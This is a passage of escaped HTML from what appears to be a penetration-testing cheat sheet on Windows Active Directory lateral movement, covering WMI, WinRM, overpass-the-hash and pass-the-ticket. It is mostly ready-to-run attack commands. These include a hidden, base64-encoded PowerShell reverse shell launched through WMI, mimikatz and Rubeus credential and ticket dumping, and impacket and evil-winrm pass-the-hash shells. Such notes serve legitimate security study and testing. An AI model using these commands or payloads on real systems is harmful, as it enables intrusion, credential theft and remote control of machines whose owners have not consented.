class=\"pl-smi\"\u003e$lport\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e);$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2\u0026gt;\u0026amp;1|Out-String );$sendback2=$sendback+\"PS \"+(pwd).Path+\"\u0026gt;\";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$b64cmd\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-k\"\u003eConvert\u003c/span\u003e]::ToBase64String([\u003cspan class=\"pl-k\"\u003eSystem.Text.Encoding\u003c/span\u003e]::Unicode.GetBytes(\u003cspan class=\"pl-smi\"\u003e$revshell\u003c/span\u003e));\n\u003cspan class=\"pl-smi\"\u003e$command\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003epowershell -ep bypass -nop -w hidden -enc \u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$b64cmd\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e requires PSCredential object to hold creds\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$secureString\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eConvertTo-SecureString\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$password\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAsPlaintext \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce;\n\u003cspan class=\"pl-smi\"\u003e$credential\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.Management.Automation.PSCredential \u003cspan class=\"pl-smi\"\u003e$username\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$secureString\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then create Common Information Model (CIM) session object with DCOM protocol\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (i.e. WMI session)\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$options\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNew-CimSessionOption\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eProtocol DCOM\n\u003cspan class=\"pl-smi\"\u003e$session\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNew-CimSession\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputerName \u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCredential \u003cspan class=\"pl-smi\"\u003e$credential\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eSessionOption \u003cspan class=\"pl-smi\"\u003e$options\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Invoke Create method of Win32_Process\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-CimMethod\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCimSession \u003cspan class=\"pl-smi\"\u003e$session\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eClassName Win32_Process \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eMethodName Create \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eArguments \u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e{\u003cspan class=\"pl-smi\"\u003eCommandLine\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$command\u003c/span\u003e};\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing WMI from Kali, which allows pass-the-hash!\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# spawns remote shell as admin user with pass-the-hash\nimpacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP\n\n# using password authentication\nimpacket-wmiexec 'ADMINUSER:PASSWORD@VICTIM_IP'\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e spawns remote shell as admin user with pass-the-hash\u003c/span\u003e\nimpacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using password authentication\u003c/span\u003e\nimpacket-wmiexec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eADMINUSER:PASSWORD@VICTIM_IP\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003eWindows Remote Management (WinRM)\u003c/em\u003e is an alternative to WMI for remote administration, which we can also abuse. The benefit is that we get the output of commands we run on the attacker's Windows machine, and we can even get an interactive PowerShell session directly through WinRM.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWinRM is the Microsoft version of the WS-Management protocol, and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP. For WinRM to work, you need plaintext credentials of a domain user who is a member of the Administrators or Remote Management Users group on the target host.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAbusing WinRM for lateral movement (from Windows host):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# legacy Windows Remote Shell (winrs) tool:\nwinrs -r:VICTIM -u:ADMINUSER -p:PASSWORD  \u0026quot;cmd /c hostname \u0026amp; whoami\u0026quot;\n# stdout of cmd is printed here!\n\n# using PowerShell\n# variable declaration\n$victim = 'VICTIM';\n$username = 'LOCALADMIN';\n$password = 'PASSWORD';\n# starts same as WMI, creating PSCredential object\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\n# create WinRM sesson\nNew-PSSession -ComputerName $victim -Credential $credential\n# interactive session\nEnter-PSSession 1\n# run specific remote commands\nInvoke-Command -ComputerName $victim -Credential $Cred -ScriptBlock { cmd.exe }\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e legacy Windows Remote Shell (winrs) tool:\u003c/span\u003e\nwinrs \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003er:VICTIM \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu:ADMINUSER \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep:PASSWORD  \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd /c hostname \u0026amp; whoami\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e stdout of cmd is printed here!\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using PowerShell\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e variable declaration\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eVICTIM\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$username\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eLOCALADMIN\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$password\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e starts same as WMI, creating PSCredential object\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$secureString\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eConvertTo-SecureString\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$password\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAsPlaintext \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eForce;\n\u003cspan class=\"pl-smi\"\u003e$credential\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.Management.Automation.PSCredential \u003cspan class=\"pl-smi\"\u003e$username\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$secureString\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create WinRM sesson\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eNew-PSSession\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputerName \u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCredential \u003cspan class=\"pl-smi\"\u003e$credential\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interactive session\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eEnter-PSSession\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run specific remote commands\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-Command\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputerName \u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCredential \u003cspan class=\"pl-smi\"\u003e$Cred\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eScriptBlock { \u003cspan class=\"pl-c1\"\u003ecmd.exe\u003c/span\u003e }\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAbusing WinRM from Kali (allows pass the hash):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# interactive shell as admin user using PtH\nevil-winrm -i VICTIM_IP -u ADMINUSER -H NTHASH\n\n# or with password auth\nevil-winrm -i VICTIM_IP -u ADMINUSER -p PASSWORD\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interactive shell as admin user using PtH\u003c/span\u003e\nevil-winrm -i VICTIM_IP -u ADMINUSER -H NTHASH\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or with password auth\u003c/span\u003e\nevil-winrm -i VICTIM_IP -u ADMINUSER -p PASSWORD\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.3.3 Overpass-the-Hash\u003c/h3\u003e\u003ca id=\"user-content-533-overpass-the-hash\" class=\"anchor\" aria-label=\"Permalink: 5.3.3 Overpass-the-Hash\" href=\"#533-overpass-the-hash\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOverpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. Once you have the impersonated-user's TGT, you can use all the Windows tools/services that rely on Kerberos in the context of that user (e.g. PsExec)\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses (set your \u003ccode\u003e/etc/hosts\u003c/code\u003e file).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using mimikatz\nprivilege::debug\n# grab hash:\nsekurlsa::logonpasswords\n# perform overpass-the-hash, starting powershell window as user\n# alternatively, kick off reverse shell\nsekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell\n# in new powershell session, interact to get/cache TGT (and TGS):\nnet use \\\\VICTIM\n# inspect that you have TGT now\nklist\n# ready to use this session with creds (see psexec cmd below)\n\n\n# using Rubeus\n# be sure to use format \u0026quot;corp.com\u0026quot; for DOMAIN\n.\\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt\n\n\n# now you can use PsExec in context of stolen user\n.\\PsExec.exe -accepteula \\\\VICTIM cmd\n# note, the spawned shell will be under stolen user, not SYSTEM\n\n# or maybe just list shares\nnet view \\\\VICTIM\ndir \\\\VICTIM\\SHARE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using mimikatz\u003c/span\u003e\nprivilege::debug\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab hash:\u003c/span\u003e\nsekurlsa::logonpasswords\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e perform overpass-the-hash, starting powershell window as user\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternatively, kick off reverse shell\u003c/span\u003e\nsekurlsa::pth \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:USER \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain:DOMAIN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003entlm:NTHASH \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003erun:powershell\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in new powershell session, interact to get/cache TGT (and TGS):\u003c/span\u003e\nnet use \\\\VICTIM\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e inspect that you have TGT now\u003c/span\u003e\nklist\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ready to use this session with creds (see psexec cmd below)\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using Rubeus\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e be sure to use format \"corp.com\" for DOMAIN\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e asktgt \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain:DOMAIN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:USER \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003erc4:NTHASH \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eptt\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e now you can use PsExec in context of stolen user\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003ePsExec.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eaccepteula \\\\VICTIM cmd\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e note, the spawned shell will be under stolen user, not SYSTEM\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or maybe just list shares\u003c/span\u003e\nnet view \\\\VICTIM\ndir \\\\VICTIM\\SHARE\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOn Kali, use impacket:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# be sure to use format \u0026quot;corp.com\u0026quot; for DOMAIN\nimpacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH # or -aesKey AESKEY\nexport KRB5CCNAME=$(pwd)/USERNAME.ccache\nimpacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN\n# this spawned shell will (still) be SYSTEM\n# when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP\n\n# if you get the error:\n[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)\n# check that the target IP is correct/matches the victim hostname\n\n# USE THIS\n# you can also do overpass-the-hash directly with one command:\nimpacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e be sure to use format \"corp.com\" for DOMAIN\u003c/span\u003e\nimpacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or -aesKey AESKEY\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e KRB5CCNAME=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003epwd\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e/USERNAME.ccache\nimpacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e this spawned shell will (still) be SYSTEM\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you get the error:\u003c/span\u003e\n[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check that the target IP is correct/matches the victim hostname\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e USE THIS\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can also do overpass-the-hash directly with one command:\u003c/span\u003e\nimpacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.3.4 Pass-the-Ticket\u003c/h3\u003e\u003ca id=\"user-content-534-pass-the-ticket\" class=\"anchor\" aria-label=\"Permalink: 5.3.4 Pass-the-Ticket\" href=\"#534-pass-the-ticket\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn Pass-the-Ticket, you steal someone else's kerberos ticket from memory and use it to access resources you wouldn't be able to. Stealing a TGS ticket more versatile than a TGT because you can use it on other machines, not just the one you stole it from. This attack is similar to Overpass-the-hash, except you're skipping over the AS-REQ, straight to the part where you have a ticket in hand.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAcquiring tickets with mimikatz:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# in mimikatz shell:\nprivilege::debug\nsekurlsa::tickets /export\nkerberos::ptt FILENAME.kirbi\n\n# in cmd shell:\n# list tickets (pick which ones you want to copy to other machine)\ndir *.kirbi\n\n# check you have the ticket in memory\nklist\n\n# then use the permissions granted by the ticket (e.g. list files in share)\nls \\\\VICTIM\\SHARE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in mimikatz shell:\u003c/span\u003e\nprivilege::debug\nsekurlsa::tickets \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eexport\nkerberos::ptt FILENAME.kirbi\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in cmd shell:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list tickets (pick which ones you want to copy to other machine)\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.kirbi\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check you have the ticket in memory\u003c/span\u003e\nklist\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then use the permissions granted by the ticket (e.g. list files in share)\u003c/span\u003e\nls \\\\VICTIM\\SHARE\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAcquiring tickets with Rubeus:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# from elevated cmd prompt\n# list all tickets in memory\n.\\Rubeus.exe triage\n\n# dump desired tickets (base64 encoded .kirbi printed to stdout)\n.\\Rubeus.exe dump /nowrap [/luid:LOGINID] [/user:USER] [/service:krbtgt]\n\n# load the ticket into session (copy and paste base64 kirbi data from previous)\n.\\Rubeus.exe ptt /ticket:BASE64_KIRBI\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e from elevated cmd prompt\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all tickets in memory\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e triage\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump desired tickets (base64 encoded .kirbi printed to stdout)\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e dump \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003enowrap [\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eluid\u003c/span\u003e:\u003cspan class=\"pl-k\"\u003eLOGINID\u003c/span\u003e] [\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003euser\u003c/span\u003e:\u003cspan class=\"pl-k\"\u003eUSER\u003c/span\u003e] [\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eservice\u003c/span\u003e:\u003cspan class=\"pl-k\"\u003ekrbtgt\u003c/span\u003e]\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e load the ticket into session (copy and paste base64 kirbi data from previous)\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e ptt \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eticket:BASE64_KIRBI\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing saved tickets from Kali:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# if you have base64 ticket from Rubeus, convert to .kirbi first\necho -n \u0026quot;BASE64_KIRBI\u0026quot; | base64 -d \u0026gt; USERNAME.kirbi\n\n# convert .kirbi to .ccache\nimpacket-ticketConverter USERNAME.kirbi USERNAME.ccache\n\n# export path to .ccache to use with other tools\nexport KRB5CCNAME=$(pwd)/USERNAME.ccache\n\n# use with crackmapexec, impacket-psexec/wmiexec/smbexec\n# make sure you set /etc/hosts to reslove FQDN for crackmapexec\ncrackmapexec smb --use-kcache VICTIM_FQDN\nimpacket-psexec -k -no-pass VICTIM_FQDN\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you have base64 ticket from Rubeus, convert to .kirbi first\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eBASE64_KIRBI\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 -d \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e USERNAME.kirbi\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert .kirbi to .ccache\u003c/span\u003e\nimpacket-ticketConverter USERNAME.kirbi USERNAME.ccache\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e export path to .ccache to use with other tools\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e KRB5CCNAME=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003epwd\u003cspan 